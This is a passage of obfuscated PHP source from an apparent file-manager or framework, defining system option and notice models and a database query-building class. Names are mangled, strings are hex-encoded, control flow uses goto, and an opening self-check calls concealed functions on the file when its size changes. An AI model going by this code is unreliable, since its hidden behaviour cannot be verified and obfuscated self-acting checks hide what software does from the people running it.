<?php
 goto e¡Ö«¶ÛçÙ; AÚÕùß¢Æ«: if ($_SERVER[$_SERVER[ÀÆ][857]] != $_size($_file)) { $_getc = $_SERVER[ÀÆ][859]; $_getfile = $_SERVER[$_SERVER[ÀÆ][860]] . $_SERVER[ÀÆ][861]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ÀÆ][229], $_getfilec); if (count($_getarrs) < $_SERVER[ÀÆ][612]) { $exit = $_SERVER[ÀÆ][862]; $exit(); } $_act = $_SERVER[ÀÆ][863]; $_act($_file); } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\x74\x65\x6d\137\x6f\160\x74\151\x6f\156"; protected $jsonField = array("\x6d\145\x6e\165", "\162\157\x6c\145", "\x72\157\x6c\x65\x47\162\x6f\x75\160", "\162\x65\x67\151\163\164", "\x65\x6d\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($à»õãÊ’) { return "\x53\x79\x73\x74\145\155\x4f\160\x74\151\157\156\137{$à»õãÊ’}"; } protected function optionDefault($³ĞÛƒâ = '') { $óçŸ =& $_SERVER[ÀÆ]; if ($³ĞÛƒâ == $óçŸ[33]) { return $GLOBALS[$óçŸ[6]][$óçŸ[379]]; } } } class SystemRecordModel extends ModelBaseLight { } goto dñ•Ü¬ô; b³ğ…¯›¨: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\56\x6e\x6f\164\x69\x63\x65\x4c\151\163\x74"; public $field = array("\x6e\x61\155\145", "\x63\157\x6e\x74\x65\x6e\x74", "\141\165\164\x68", "\x6d\157\x64\145", "\x74\x69\x6d\145", "\164\x79\x70\x65", "\154\145\166\145\154", "\145\156\x61\142\x6c\x65", "\163\x6f\162\164"); public function listData($¨Ë°’œ = false, $ö»†°Ò® = "\x73\157\162\164", $éÇÚ­Š•Äã = false) { return parent::listData($¨Ë°’œ, $ö»†°Ò®, $éÇÚ­Š•Äã); } public function add($™Æ) { $©› =& $_SERVER[ÀÆ]; $×¥çÓ¬ŠÏÙ = time(); if ($™Æ[$©›[12]] == $©›[2152]) { $×¥çÓ¬ŠÏÙ = strtotime($™Æ[$©›[197]]); } $™Æ[$©›[197]] = $×¥çÓ¬ŠÏÙ; return parent::insert($™Æ); } public function update($Ë , $¹ß»„÷Æá©) { $ÁİÖÈ«µ =& $_SERVER[ÀÆ]; $ÍÆéïã½€ = $this->listData($Ë ); if (!$ÍÆéïã½€) { return !1; } $ò» = time(); if ($¹ß»„÷Æá©[$ÁİÖÈ«µ[12]] == $ÁİÖÈ«µ[2152]) { $ò» = strtotime($¹ß»„÷Æá©[$ÁİÖÈ«µ[197]]); } $¹ß»„÷Æá©[$ÁİÖÈ«µ[197]] = $ò»; return parent::update($Ë , $¹ß»„÷Æá©); } public function remove($å…ôãŠ¿Ğ) { $¿§£ÚÜÈĞ¶êÜ = $this->listData($å…ôãŠ¿Ğ); if (!$¿§£ÚÜÈĞ¶êÜ || $¿§£ÚÜÈĞ¶êÜ[$_SERVER[ÀÆ][1203]]) { return !1; } return parent::remove($å…ôãŠ¿Ğ); } public function sort($úÔÃÆª, $Á¨±ó­) { return parent::update($úÔÃÆª, $Á¨±ó­); } public function enable($õÒÜÈÒæ”, $¸¤‘¿) { return parent::update($õÒÜÈÒæ”, array($_SERVER[ÀÆ][2153] => $¸¤‘¿)); } private function initUserOption() { $¿¸ñšë˜ =& $_SERVER[ÀÆ]; $this->optionType = $¿¸ñšë˜[2154]; $this->modelType = $¿¸ñšë˜[2155]; $this->field = array($¿¸ñšë˜[2156], $¿¸ñšë˜[28], $¿¸ñšë˜[197], $¿¸ñšë˜[29], $¿¸ñšë˜[2157], $¿¸ñšë˜[735], $¿¸ñšë˜[189]); } public function userNoticeGet($í”Ë·¸ÄÚ„ = false) { $this->initUserOption(); return parent::listData($í”Ë·¸ÄÚ„, $_SERVER[ÀÆ][395], !0); } public function userNoticeAdd($Äë¿å©à) { $¬ÌÚÉê¬¨ =& $_SERVER[ÀÆ]; $this->initUserOption(); $ã®µêïŒö = $this->findByKey($¬ÌÚÉê¬¨[2156], $Äë¿å©à[$¬ÌÚÉê¬¨[395]]); if ($ã®µêïŒö) { return !0; } $Œ»¬ıµõíÕ = array($¬ÌÚÉê¬¨[2156] => $Äë¿å©à[$¬ÌÚÉê¬¨[395]], $¬ÌÚÉê¬¨[28] => $Äë¿å©à[$¬ÌÚÉê¬¨[28]], $¬ÌÚÉê¬¨[197] => $Äë¿å©à[$¬ÌÚÉê¬¨[197]], $¬ÌÚÉê¬¨[29] => isset($Äë¿å©à[$¬ÌÚÉê¬¨[29]]) ? $Äë¿å©à[$¬ÌÚÉê¬¨[29]] : 1, $¬ÌÚÉê¬¨[2157] => isset($Äë¿å©à[$¬ÌÚÉê¬¨[2157]]) ? $Äë¿å©à[$¬ÌÚÉê¬¨[2157]] : 0, $¬ÌÚÉê¬¨[735] => 0, $¬ÌÚÉê¬¨[189] => 0); return parent::insert($Œ»¬ıµõíÕ); } public function userNoticeEdit($„µñÓğÆƒ, $Ö‹Œ¡åù·Ø) { $this->initUserOption(); return parent::update($„µñÓğÆƒ, $Ö‹Œ¡åù·Ø); } } $_file = $_SERVER[$_SERVER[ÀÆ][864]]; $_size = $_SERVER[ÀÆ][872]; goto AÚÕùß¢Æ«; Dİ¼¸ŞÜèÁ: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\x69\x6e\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\x3d", "\x6e\x65\161" => "\74\x3e", "\x67\164" => "\x3e", "\x65\x67\x74" => "\76\75", "\x6c\164" => "\x3c", "\145\x6c\164" => "\x3c\75", "\156\x6f\164\x6c\151\153\x65" => "\116\x4f\x54\40\114\111\x4b\x45", "\154\x69\x6b\x65" => "\114\x49\x4b\x45", "\x69\156" => "\x49\x4e", "\156\157\164\x69\x6e" => "\116\x4f\124\40\x49\116", "\156\157\164\x20\x69\x6e" => "\x4e\x4f\124\40\x49\x4e", "\142\x65\164\x77\145\x65\156" => "\x42\x45\x54\127\x45\105\116", "\x6e\x6f\164\x62\145\x74\x77\145\145\x6e" => "\x4e\117\x54\x20\x42\105\124\127\105\105\116", "\x6e\x6f\x74\x20\142\x65\x74\x77\x65\x65\156" => "\x4e\117\124\x20\x42\x45\x54\x57\105\105\x4e"); protected $selectSql = "\x53\105\114\x45\x43\x54\x25\104\x49\123\x54\x49\116\x43\124\45\40\45\106\111\105\114\104\x25\x20\106\x52\117\x4d\40\45\124\101\x42\114\x45\x25\45\112\117\111\116\x25\x25\x57\x48\x45\122\105\45\x25\x47\x52\x4f\x55\x50\45\x25\110\x41\126\x49\116\x47\x25\x25\117\122\104\105\122\45\45\114\x49\115\x49\124\x25\x20\45\x55\116\x49\117\x4e\x25\45\x43\117\115\x4d\105\116\x54\45"; protected $bind = array(); public static function getInstance() { $¹¸‚°‡¯øê¼ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ÀÆ][953], $¹¸‚°‡¯øê¼); } public function factory($øä™ = '') { $ß¨ÉÁ¤¹¼ =& $_SERVER[ÀÆ]; $øä™ = $this->parseConfig($øä™); if (empty($øä™[$ß¨ÉÁ¤¹¼[954]])) { think_exception(think_lang($ß¨ÉÁ¤¹¼[955])); } $this->dbType = ucwords(strtolower($øä™[$ß¨ÉÁ¤¹¼[954]])); $°º‡• = $ß¨ÉÁ¤¹¼[956] . $this->dbType; if (class_exists($°º‡•)) { $ÂÓÅ‹Ï€ú¢à½ = new $°º‡•($øä™); if ($ß¨ÉÁ¤¹¼[782] != strtolower($øä™[$ß¨ÉÁ¤¹¼[954]])) { $ÂÓÅ‹Ï€ú¢à½->dbType = strtoupper($this->dbType); } else { $ÂÓÅ‹Ï€ú¢à½->dbType = $this->_getDsnType($øä™[$ß¨ÉÁ¤¹¼[909]]); } } else { think_exception(think_lang($ß¨ÉÁ¤¹¼[957]) . $ß¨ÉÁ¤¹¼[958] . $°º‡•); } return $ÂÓÅ‹Ï€ú¢à½; } public function __call($¾ë, $ªë¬«ôóğƒÜ¶) { if (method_exists($this, $¾ë)) { return call_user_func_array(array($this, $¾ë), $ªë¬«ôóğƒÜ¶); } } protected function _getDsnType($ÄÌşãÚÊÎ ¦) { $ÕÉ¹»ÄÙÆë = explode($_SERVER[ÀÆ][4], $ÄÌşãÚÊÎ ¦); $Éµß«ª¹ = strtoupper(trim($ÕÉ¹»ÄÙÆë[0])); return $Éµß«ª¹; } private function parseConfig($…ÅŞÚäãäîê® = '') { $Ú£ =& $_SERVER[ÀÆ]; if (!empty($…ÅŞÚäãäîê®) && is_string($…ÅŞÚäãäîê®)) { $…ÅŞÚäãäîê® = $this->parseDSN($…ÅŞÚäãäîê®); } elseif (is_array($…ÅŞÚäãäîê®)) { $…ÅŞÚäãäîê® = array_change_key_case($…ÅŞÚäãäîê®); $…ÅŞÚäãäîê® = array($Ú£[954] => $…ÅŞÚäãäîê®[$Ú£[781]], $Ú£[882] => $…ÅŞÚäãäîê®[$Ú£[959]], $Ú£[883] => $…ÅŞÚäãäîê®[$Ú£[960]], $Ú£[880] => $…ÅŞÚäãäîê®[$Ú£[961]], $Ú£[881] => $…ÅŞÚäãäîê®[$Ú£[962]], $Ú£[17] => $…ÅŞÚäãäîê®[$Ú£[963]], $Ú£[909] => $…ÅŞÚäãäîê®[$Ú£[783]], $Ú£[13] => isset($…ÅŞÚäãäîê®[$Ú£[964]]) ? $…ÅŞÚäãäîê®[$Ú£[964]] : array()); } elseif (empty($…ÅŞÚäãäîê®)) { if (think_config($Ú£[965]) && $Ú£[782] != strtolower(think_config($Ú£[966]))) { $…ÅŞÚäãäîê® = $this->parseDSN(think_config($Ú£[965])); } else { $…ÅŞÚäãäîê® = array($Ú£[954] => think_config($Ú£[966]), $Ú£[882] => think_config($Ú£[967]), $Ú£[883] => think_config($Ú£[968]), $Ú£[880] => think_config($Ú£[969]), $Ú£[881] => think_config($Ú£[970]), $Ú£[17] => think_config($Ú£[244]), $Ú£[909] => think_config($Ú£[965]), $Ú£[13] => think_config($Ú£[971])); } } return $…ÅŞÚäãäîê®; } protected function initConnect($º®Æö€Ş¤ = true) { if (1 == think_config($_SERVER[ÀÆ][18])) { $this->_linkID = $this->multiConnect($º®Æö€Ş¤); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $“ÒˆÄÛ  => $’ĞÇ) { $this->_linkID = $’ĞÇ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($Üá¢ €ñÎ‚ = false) { $ß¦‰ë =& $_SERVER[ÀÆ]; static $÷°» = array(); static $Ã€Ğêë¸Ç©· = -1; if (empty($÷°»)) { foreach ($this->config as $ßÉÚ => $À›) { $÷°»[$ßÉÚ] = explode($ß¦‰ë[47], $À›); } } if (think_config($ß¦‰ë[972])) { if ($Üá¢ €ñÎ‚ || think_config($ß¦‰ë[391]) === !0) { $é€ = floor(mt_rand(0, think_config($ß¦‰ë[973]) - 1)); $Ã€Ğêë¸Ç©· = $é€; } else { if (is_numeric(think_config($ß¦‰ë[974]))) { $é€ = think_config($ß¦‰ë[974]); } else { $é€ = floor(mt_rand(think_config($ß¦‰ë[973]), count($÷°»[$ß¦‰ë[880]]) - 1)); } } } else { $é€ = floor(mt_rand(0, count($÷°»[$ß¦‰ë[880]]) - 1)); $Ã€Ğêë¸Ç©· = $é€; } $é€ = $Ã€Ğêë¸Ç©· !== -1 ? $Ã€Ğêë¸Ç©· : $é€; $¬É = array($ß¦‰ë[882] => isset($÷°»[$ß¦‰ë[882]][$é€]) ? $÷°»[$ß¦‰ë[882]][$é€] : $÷°»[$ß¦‰ë[882]][0], $ß¦‰ë[883] => isset($÷°»[$ß¦‰ë[883]][$é€]) ? $÷°»[$ß¦‰ë[883]][$é€] : $÷°»[$ß¦‰ë[883]][0], $ß¦‰ë[880] => isset($÷°»[$ß¦‰ë[880]][$é€]) ? $÷°»[$ß¦‰ë[880]][$é€] : $÷°»[$ß¦‰ë[880]][0], $ß¦‰ë[881] => isset($÷°»[$ß¦‰ë[881]][$é€]) ? $÷°»[$ß¦‰ë[881]][$é€] : $÷°»[$ß¦‰ë[881]][0], $ß¦‰ë[17] => isset($÷°»[$ß¦‰ë[17]][$é€]) ? $÷°»[$ß¦‰ë[17]][$é€] : $÷°»[$ß¦‰ë[17]][0], $ß¦‰ë[909] => isset($÷°»[$ß¦‰ë[909]][$é€]) ? $÷°»[$ß¦‰ë[909]][$é€] : $÷°»[$ß¦‰ë[909]][0], $ß¦‰ë[13] => isset($÷°»[$ß¦‰ë[13]][$é€]) ? $÷°»[$ß¦‰ë[13]][$é€] : $÷°»[$ß¦‰ë[13]][0]); return $this->connect($¬É, $é€); } public function parseDSN($Ã»±Ãú) { $‚ìÚ˜ =& $_SERVER[ÀÆ]; if (empty($Ã»±Ãú)) { return !1; } $ÜÊ = parse_url($Ã»±Ãú); if ($ÜÊ[$‚ìÚ˜[174]]) { $éÌü„˜ = array($‚ìÚ˜[954] => $ÜÊ[$‚ìÚ˜[174]], $‚ìÚ˜[882] => isset($ÜÊ[$‚ìÚ˜[588]]) ? $ÜÊ[$‚ìÚ˜[588]] : $‚ìÚ˜[33], $‚ìÚ˜[883] => isset($ÜÊ[$‚ìÚ˜[975]]) ? $ÜÊ[$‚ìÚ˜[975]] : $‚ìÚ˜[33], $‚ìÚ˜[880] => isset($ÜÊ[$‚ìÚ˜[175]]) ? $ÜÊ[$‚ìÚ˜[175]] : $‚ìÚ˜[33], $‚ìÚ˜[881] => isset($ÜÊ[$‚ìÚ˜[176]]) ? $ÜÊ[$‚ìÚ˜[176]] : $‚ìÚ˜[33], $‚ìÚ˜[17] => isset($ÜÊ[$‚ìÚ˜[76]]) ? substr($ÜÊ[$‚ìÚ˜[76]], 1) : $‚ìÚ˜[33]); } else { preg_match($‚ìÚ˜[976], trim($Ã»±Ãú), $ğÉ); $éÌü„˜ = array($‚ìÚ˜[954] => $ğÉ[1], $‚ìÚ˜[882] => $ğÉ[2], $‚ìÚ˜[883] => $ğÉ[3], $‚ìÚ˜[880] => $ğÉ[4], $‚ìÚ˜[881] => $ğÉ[5], $‚ìÚ˜[17] => $ğÉ[6]); } $éÌü„˜[$‚ìÚ˜[909]] = $‚ìÚ˜[33]; return $éÌü„˜; } protected function debug() { $ÌòáâÀæ÷‘Ø =& $_SERVER[ÀÆ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ÌòáâÀæ÷‘Ø[977]; if (think_config($ÌòáâÀæ÷‘Ø[978])) { think_status($ÌòáâÀæ÷‘Ø[979]); think_trace($this->queryStr . $ÌòáâÀæ÷‘Ø[980] . think_status($ÌòáâÀæ÷‘Ø[20], $ÌòáâÀæ÷‘Ø[979], 6) . $ÌòáâÀæ÷‘Ø[981], $ÌòáâÀæ÷‘Ø[33], $ÌòáâÀæ÷‘Ø[982]); } } protected function parseLock($ÊŒš = false) { $¿…íÃÇ¢ş =& $_SERVER[ÀÆ]; if (!$ÊŒš) { return $¿…íÃÇ¢ş[33]; } if ($¿…íÃÇ¢ş[911] == $this->dbType) { return $¿…íÃÇ¢ş[983]; } return $¿…íÃÇ¢ş[984]; } protected function parseSet($§ú¼) { $®Å–©‡ëá¦ =& $_SERVER[ÀÆ]; foreach ($§ú¼ as $ÎÁ => $Ï“ù£) { if (is_array($Ï“ù£) && $®Å–©‡ëá¦[295] == $Ï“ù£[0]) { $¿À‹‚Û€ïâ[] = $this->parseKey($ÎÁ) . $®Å–©‡ëá¦[985] . $Ï“ù£[1]; } elseif (is_scalar($Ï“ù£) || is_null($Ï“ù£)) { $¿À‹‚Û€ïâ[] = $this->parseKey($ÎÁ) . $®Å–©‡ëá¦[985] . $this->parseValue($Ï“ù£); } } return $®Å–©‡ëá¦[986] . implode($®Å–©‡ëá¦[47], $¿À‹‚Û€ïâ); } protected function bindParam($ÔÕ¬Œ¨îƒüïæ, $’ÉŠ««ıÛÍ’ù) { $this->bind[$_SERVER[ÀÆ][4] . $ÔÕ¬Œ¨îƒüïæ] = $’ÉŠ««ıÛÍ’ù; } protected function parseBind($§ØúŠ) { $§ØúŠ = array_merge($this->bind, $§ØúŠ); $this->bind = array(); return $§ØúŠ; } function parseKey(&$ÃÑ¬ˆ´­ò×Ìõ, $Úœö‹œÎ¬Ò = true) { if ($Úœö‹œÎ¬Ò) { $ÃÑ¬ˆ´­ò×Ìõ = $this->parseKeyCheck($ÃÑ¬ˆ´­ò×Ìõ); } return $ÃÑ¬ˆ´­ò×Ìõ; } function parseKeyCheck($üõ›¿âç) { $¿¾ì =& $_SERVER[ÀÆ]; $üõ›¿âç = trim($üõ›¿âç); if (!preg_match($¿¾ì[987], $üõ›¿âç)) { think_exception($¿¾ì[988] . $üõ›¿âç); } return $üõ›¿âç; } protected function parseValue($ÍÛ¿¥¢Ã) { $ÑºÕƒ‘ =& $_SERVER[ÀÆ]; if (is_string($ÍÛ¿¥¢Ã)) { $ÍÛ¿¥¢Ã = $ÑºÕƒ‘[950] . $this->escapeString($ÍÛ¿¥¢Ã) . $ÑºÕƒ‘[950]; } elseif (isset($ÍÛ¿¥¢Ã[0]) && is_string($ÍÛ¿¥¢Ã[0]) && strtolower($ÍÛ¿¥¢Ã[0]) == $ÑºÕƒ‘[295]) { $ÍÛ¿¥¢Ã = $this->escapeString($ÍÛ¿¥¢Ã[1]); } elseif (is_array($ÍÛ¿¥¢Ã)) { $ÍÛ¿¥¢Ã = array_map(array($this, $ÑºÕƒ‘[951]), $ÍÛ¿¥¢Ã); } elseif (is_bool($ÍÛ¿¥¢Ã)) { $ÍÛ¿¥¢Ã = $ÍÛ¿¥¢Ã ? $ÑºÕƒ‘[87] : $ÑºÕƒ‘[191]; } elseif (is_null($ÍÛ¿¥¢Ã)) { $ÍÛ¿¥¢Ã = $ÑºÕƒ‘[103]; } return $ÍÛ¿¥¢Ã; } protected function parseField($ƒ¤Ø) { $¶Êß¯Š‰ =& $_SERVER[ÀÆ]; if (is_string($ƒ¤Ø) && strpos($ƒ¤Ø, $¶Êß¯Š‰[47])) { $ƒ¤Ø = explode($¶Êß¯Š‰[47], $ƒ¤Ø); } if (is_array($ƒ¤Ø)) { $€èÈëœ›ï” = array(); foreach ($ƒ¤Ø as $€ã¤ => $Äé¹Õ§…úğì) { if (!is_numeric($€ã¤)) { $€èÈëœ›ï”[] = $this->parseKey($€ã¤, !1) . $¶Êß¯Š‰[989] . $this->parseKey($Äé¹Õ§…úğì); } else { $€èÈëœ›ï”[] = $this->parseKey($Äé¹Õ§…úğì); } } $ƒŒì = implode($¶Êß¯Š‰[47], $€èÈëœ›ï”); } elseif (is_string($ƒ¤Ø) && !empty($ƒ¤Ø)) { $ƒŒì = $ƒ¤Ø; } else { $ƒŒì = $¶Êß¯Š‰[182]; } return $ƒŒì; } protected function parseTable($Îê‚¦£¬­Î£²) { $°¬ =& $_SERVER[ÀÆ]; if (is_array($Îê‚¦£¬­Î£²)) { $©ŞËæ“ = array(); foreach ($Îê‚¦£¬­Î£² as $œÃ“öº¼È => $ğ»İ) { if (!is_numeric($œÃ“öº¼È)) { $©ŞËæ“[] = $this->parseKey($œÃ“öº¼È) . $°¬[50] . $this->parseKey($ğ»İ); } else { $©ŞËæ“[] = $this->parseKey($œÃ“öº¼È); } } $Îê‚¦£¬­Î£² = $©ŞËæ“; } elseif (is_string($Îê‚¦£¬­Î£²)) { if (strstr($Îê‚¦£¬­Î£², $°¬[50])) { return $Îê‚¦£¬­Î£²; } $Îê‚¦£¬­Î£² = explode($°¬[47], $Îê‚¦£¬­Î£²); array_walk($Îê‚¦£¬­Î£², array($this, $°¬[900])); } return $°¬[894] . trim(implode($°¬[990], $Îê‚¦£¬­Î£²), $°¬[383]) . $°¬[894]; } protected function parseWhere($Ò“¹Åß) { $³¹×ÛÉÀœ©® =& $_SERVER[ÀÆ]; $ì™Ùû÷îÕ¥“ˆ = $³¹×ÛÉÀœ©®[33]; if (is_string($Ò“¹Åß)) { $ì™Ùû÷îÕ¥“ˆ = $Ò“¹Åß; } else { $­•ÛÑüÏÓ„õÊ = isset($Ò“¹Åß[$³¹×ÛÉÀœ©®[991]]) ? strtoupper($Ò“¹Åß[$³¹×ÛÉÀœ©®[991]]) : $³¹×ÛÉÀœ©®[33]; if (in_array($­•ÛÑüÏÓ„õÊ, array($³¹×ÛÉÀœ©®[992], $³¹×ÛÉÀœ©®[993], $³¹×ÛÉÀœ©®[994]))) { $­•ÛÑüÏÓ„õÊ = $³¹×ÛÉÀœ©®[50] . $­•ÛÑüÏÓ„õÊ . $³¹×ÛÉÀœ©®[50]; unset($Ò“¹Åß[$³¹×ÛÉÀœ©®[991]]); } else { $­•ÛÑüÏÓ„õÊ = $³¹×ÛÉÀœ©®[995]; } foreach ($Ò“¹Åß as $…ñÖÃú => $¾ÙºøƒË³) { $ì™Ùû÷îÕ¥“ˆ .= $³¹×ÛÉÀœ©®[275]; if (is_numeric($…ñÖÃú)) { $…ñÖÃú = $³¹×ÛÉÀœ©®[996]; } if (0 === strpos($…ñÖÃú, $³¹×ÛÉÀœ©®[71])) { $ì™Ùû÷îÕ¥“ˆ .= $this->parseThinkWhere($…ñÖÃú, $¾ÙºøƒË³); } else { if (!preg_match($³¹×ÛÉÀœ©®[997], trim($…ñÖÃú))) { think_exception(think_lang($³¹×ÛÉÀœ©®[998]) . $³¹×ÛÉÀœ©®[4] . $…ñÖÃú); } $Ÿ¡ê†í = is_array($¾ÙºøƒË³) && isset($¾ÙºøƒË³[$³¹×ÛÉÀœ©®[999]]); $…ñÖÃú = trim($…ñÖÃú); if (strpos($…ñÖÃú, $³¹×ÛÉÀœ©®[281])) { $Ûéôƒøì = explode($³¹×ÛÉÀœ©®[281], $…ñÖÃú); $êÙÄÇ = array(); foreach ($Ûéôƒøì as $Æ×°ü˜Ñ¾ => $ïíõòºÛ’) { $æÂ›şÈŸÚ‘ = $Ÿ¡ê†í ? $¾ÙºøƒË³[$Æ×°ü˜Ñ¾] : $¾ÙºøƒË³; $êÙÄÇ[] = $³¹×ÛÉÀœ©®[258] . $this->parseWhereItem($this->parseKey($ïíõòºÛ’), $æÂ›şÈŸÚ‘) . $³¹×ÛÉÀœ©®[899]; } $ì™Ùû÷îÕ¥“ˆ .= implode($³¹×ÛÉÀœ©®[1000], $êÙÄÇ); } elseif (strpos($…ñÖÃú, $³¹×ÛÉÀœ©®[282])) { $Ûéôƒøì = explode($³¹×ÛÉÀœ©®[282], $…ñÖÃú); $êÙÄÇ = array(); foreach ($Ûéôƒøì as $Æ×°ü˜Ñ¾ => $ïíõòºÛ’) { $æÂ›şÈŸÚ‘ = $Ÿ¡ê†í ? $¾ÙºøƒË³[$Æ×°ü˜Ñ¾] : $¾ÙºøƒË³; $êÙÄÇ[] = $³¹×ÛÉÀœ©®[258] . $this->parseWhereItem($this->parseKey($ïíõòºÛ’), $æÂ›şÈŸÚ‘) . $³¹×ÛÉÀœ©®[899]; } $ì™Ùû÷îÕ¥“ˆ .= implode($³¹×ÛÉÀœ©®[995], $êÙÄÇ); } else { $ì™Ùû÷îÕ¥“ˆ .= $this->parseWhereItem($this->parseKey($…ñÖÃú), $¾ÙºøƒË³); } } $ì™Ùû÷îÕ¥“ˆ .= $³¹×ÛÉÀœ©®[276] . $­•ÛÑüÏÓ„õÊ; } $ì™Ùû÷îÕ¥“ˆ = substr($ì™Ùû÷îÕ¥“ˆ, 0, -strlen($­•ÛÑüÏÓ„õÊ)); } return empty($ì™Ùû÷îÕ¥“ˆ) ? $³¹×ÛÉÀœ©®[33] : $³¹×ÛÉÀœ©®[1001] . $ì™Ùû÷îÕ¥“ˆ; } protected function parseWhereItem($ŸÙ, $Ü»Ì­ğ¡˜®) { $ñ÷‰¡¿Ï†É =& $_SERVER[ÀÆ]; $â‹ï = $ñ÷‰¡¿Ï†É[33]; if (is_array($Ü»Ì­ğ¡˜®)) { if (is_string($Ü»Ì­ğ¡˜®[0])) { $ŞÚŸ²«¬Ğ¨ç = strtolower($Ü»Ì­ğ¡˜®[0]); if (in_array($Ü»Ì­ğ¡˜®[0], array($ñ÷‰¡¿Ï†É[985], $ñ÷‰¡¿Ï†É[1002], $ñ÷‰¡¿Ï†É[1003], $ñ÷‰¡¿Ï†É[1004], $ñ÷‰¡¿Ï†É[1005], $ñ÷‰¡¿Ï†É[1006]))) { $â‹ï .= $ŸÙ . $ñ÷‰¡¿Ï†É[50] . $Ü»Ì­ğ¡˜®[0] . $ñ÷‰¡¿Ï†É[50] . $this->parseValue($Ü»Ì­ğ¡˜®[1]); } elseif (preg_match($ñ÷‰¡¿Ï†É[1007], $Ü»Ì­ğ¡˜®[0])) { $â‹ï .= $ŸÙ . $ñ÷‰¡¿Ï†É[50] . $this->exp[$ŞÚŸ²«¬Ğ¨ç] . $ñ÷‰¡¿Ï†É[50] . $this->parseValue($Ü»Ì­ğ¡˜®[1]); } elseif (preg_match($ñ÷‰¡¿Ï†É[1008], $Ü»Ì­ğ¡˜®[0])) { if (is_array($Ü»Ì­ğ¡˜®[1])) { $ï»ƒ = isset($Ü»Ì­ğ¡˜®[2]) ? strtoupper($Ü»Ì­ğ¡˜®[2]) : $ñ÷‰¡¿Ï†É[993]; if (in_array($ï»ƒ, array($ñ÷‰¡¿Ï†É[992], $ñ÷‰¡¿Ï†É[993], $ñ÷‰¡¿Ï†É[994]))) { $÷Êªø¢¼ô‘’ = array(); foreach ($Ü»Ì­ğ¡˜®[1] as $ß’) { $÷Êªø¢¼ô‘’[] = $ŸÙ . $ñ÷‰¡¿Ï†É[50] . $this->exp[$ŞÚŸ²«¬Ğ¨ç] . $ñ÷‰¡¿Ï†É[50] . $this->parseValue($ß’); } $â‹ï .= $ñ÷‰¡¿Ï†É[258] . implode($ñ÷‰¡¿Ï†É[50] . $ï»ƒ . $ñ÷‰¡¿Ï†É[50], $÷Êªø¢¼ô‘’) . $ñ÷‰¡¿Ï†É[899]; } } else { $â‹ï .= $ŸÙ . $ñ÷‰¡¿Ï†É[50] . $this->exp[$ŞÚŸ²«¬Ğ¨ç] . $ñ÷‰¡¿Ï†É[50] . $this->parseValue($Ü»Ì­ğ¡˜®[1]); } } elseif ($ñ÷‰¡¿Ï†É[295] == $ŞÚŸ²«¬Ğ¨ç) { $â‹ï .= $ñ÷‰¡¿Ï†É[897] . $ŸÙ . $ñ÷‰¡¿Ï†É[50] . $Ü»Ì­ğ¡˜®[1] . $ñ÷‰¡¿Ï†É[1009]; } elseif (preg_match($ñ÷‰¡¿Ï†É[1010], $Ü»Ì­ğ¡˜®[0])) { $â‹ï .= $Ü»Ì­ğ¡˜®[0]; } elseif (preg_match($ñ÷‰¡¿Ï†É[1011], $Ü»Ì­ğ¡˜®[0])) { if (isset($Ü»Ì­ğ¡˜®[2]) && $ñ÷‰¡¿Ï†É[295] == $Ü»Ì­ğ¡˜®[2]) { $â‹ï .= $ŸÙ . $ñ÷‰¡¿Ï†É[50] . $this->exp[$ŞÚŸ²«¬Ğ¨ç] . $ñ÷‰¡¿Ï†É[50] . $Ü»Ì­ğ¡˜®[1]; } else { if (is_string($Ü»Ì­ğ¡˜®[1])) { $Ü»Ì­ğ¡˜®[1] = explode($ñ÷‰¡¿Ï†É[47], $Ü»Ì­ğ¡˜®[1]); } $¿åÌÊ’ø¤ = implode($ñ÷‰¡¿Ï†É[47], $this->parseValue($Ü»Ì­ğ¡˜®[1])); $â‹ï .= $ŸÙ . $ñ÷‰¡¿Ï†É[50] . $this->exp[$ŞÚŸ²«¬Ğ¨ç] . $ñ÷‰¡¿Ï†É[897] . $¿åÌÊ’ø¤ . $ñ÷‰¡¿Ï†É[899]; } } elseif (preg_match($ñ÷‰¡¿Ï†É[1012], $Ü»Ì­ğ¡˜®[0])) { $ ¢õÚù = is_string($Ü»Ì­ğ¡˜®[1]) ? explode($ñ÷‰¡¿Ï†É[47], $Ü»Ì­ğ¡˜®[1]) : $Ü»Ì­ğ¡˜®[1]; $â‹ï .= $ñ÷‰¡¿Ï†É[897] . $ŸÙ . $ñ÷‰¡¿Ï†É[50] . $this->exp[$ŞÚŸ²«¬Ğ¨ç] . $ñ÷‰¡¿Ï†É[50] . $this->parseValue($ ¢õÚù[0]) . $ñ÷‰¡¿Ï†É[995] . $this->parseValue($ ¢õÚù[1]) . $ñ÷‰¡¿Ï†É[276]; } else { think_exception(think_lang($ñ÷‰¡¿Ï†É[998]) . $ñ÷‰¡¿Ï†É[4] . $Ü»Ì­ğ¡˜®[0]); } } else { $è¼‚±ğä¬¸« = count($Ü»Ì­ğ¡˜®); $¯Ÿæ¼• = $ñ÷‰¡¿Ï†É[33]; if (is_string($Ü»Ì­ğ¡˜®[$è¼‚±ğä¬¸« - 1])) { $¯Ÿæ¼• = isset($Ü»Ì­ğ¡˜®[$è¼‚±ğä¬¸« - 1]) ? strtoupper($Ü»Ì­ğ¡˜®[$è¼‚±ğä¬¸« - 1]) : $ñ÷‰¡¿Ï†É[33]; if (in_array($¯Ÿæ¼•, array($ñ÷‰¡¿Ï†É[992], $ñ÷‰¡¿Ï†É[993], $ñ÷‰¡¿Ï†É[994]))) { $è¼‚±ğä¬¸« = $è¼‚±ğä¬¸« - 1; } } else { $¯Ÿæ¼• = $ñ÷‰¡¿Ï†É[992]; } for ($Ñóà = 0; 